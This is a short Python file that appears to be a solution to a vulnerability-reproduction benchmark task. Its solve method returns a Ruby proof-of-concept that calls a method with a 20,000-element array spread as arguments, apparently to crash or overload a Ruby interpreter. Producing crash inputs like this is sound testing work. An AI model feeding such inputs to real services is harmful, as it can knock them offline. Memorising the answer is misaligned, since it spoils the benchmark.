import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = (
            "def foo(*args)\n"
            "end\n"
            "a = Array.new(20000, 0)\n"
            "foo(*a)\n"
        )
        return poc.encode("utf-8")
